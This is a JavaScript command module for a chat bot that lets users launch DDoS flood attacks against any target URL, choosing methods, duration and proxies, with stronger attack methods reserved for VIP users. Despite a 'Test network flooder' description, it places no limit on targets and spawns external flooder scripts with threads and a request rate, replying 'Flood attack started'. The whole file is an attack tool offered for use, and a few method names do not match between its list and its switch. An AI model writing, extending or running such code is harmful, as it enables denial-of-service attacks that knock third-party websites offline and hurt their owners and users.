const { spawn } = require("child_process");

let lastExecutedTime = {};

module.exports = {
  name: ["ddos", "flood"],
  description: "Test network flooder",
  category: ["Security"],
  limit: 1,
  async execute(m, { client, args, isVip, prefix }) {
    try {
      const proxy = "./proxy.txt";
      const thread = 3;
      const rps = 250;

      const userId = m.sender; 
      const currentTime = Date.now();

      if (lastExecutedTime[userId] && currentTime - lastExecutedTime[userId] < 90 * 1000) {
        const waitTime = Math.ceil((90 * 1000 - (currentTime - lastExecutedTime[userId])) / 1000);
        return m.reply(`Please wait ${waitTime} seconds before using this command again.`);
      }

      if (args.length < 3) {
        return m.reply(
          `\`Usage:\` \`\`\`/${prefix}ddos <target_url> <method> <time>\`\`\`\n\n\`Ex:\` \`\`\`${prefix}ddos https://www.ailibytes.xyz httpx 60\`\`\``
        );
      }

      const target = args[0];
      const method = args[1];
      const duration = parseInt(args[2]);

      const freeMethods = ["raw", "proxy", "storm"];
      const vipMethods = ["httpx", "glory", "tslvip"];
      const validMethods = isVip ? [...freeMethods, ...vipMethods] : freeMethods;

      if (!validMethods.includes(method)) {
        return m.reply(
          `Invalid method. Available methods for ${
            isVip ? "VIP users" : "free users"
          }: ${validMethods.join(", ")}`
        );
      }

      if (!isVip && duration > 30) {
        return m.reply(
          "As a free user, you are limited to a maximum duration of 30 seconds."
        );
      } else if (isVip && duration < 30) {
        m.reply("Note: You can set a duration of 30 seconds or more.");
      }

      let command = "";
      let argsList = [];

      switch (method) {
        case "raw":
        case "proxy":
        case "storm":
          command = "node";
          argsList = [`net/raw.js`, target, duration, method, thread];
          break;
        case "glory":
          command = "node";
          argsList = [
            `net/glory.js`,
            target,
            duration,
            rps,
            thread,
            proxy,
          ];
          break;
        case "httpx":
          command = "node";
          argsList = [
            `net/http-x.js`,
            target,
            duration,
            rps,
            thread,
            proxy,
          ];
          break;
        case "swarm":
          command = "node";
          argsList = [
            `net/swarm.js`,
            target,
            duration,
            rps,
            thread,
            proxy,
          ];
          break;
        case "tlsvip":
          command = "node";
          argsList = [
            `net/tslvip.js`,
            target,
            duration,
            rps,
            thread,
            proxy,
          ];
          break;
        default:
          return m.reply("Unexpected error in method selection.");
      }

      m.reply(
        `Flood attack started:\n\nTarget: ${target}\nMethod: ${method}\nDuration: ${duration} seconds`
      );

      const process = spawn(command, argsList);

      process.stdout.on("data", (data) => {
        const message = data.toString().trim();
        console.log(`[STDOUT] ${message}`);
      });

      process.stderr.on("data", (data) => {
        const error = data.toString().trim();
        console.error(`[STDERR] ${error}`);
      });

      process.on("close", (code) => {
        console.log(`Flood attack process exited with code ${code}`);
      });

      lastExecutedTime[userId] = currentTime;
    } catch (err) {
      console.error(`Unexpected error: ${err.message}`);
      m.reply(`An unexpected error occurred: ${err.message}`);
    }
  },
};
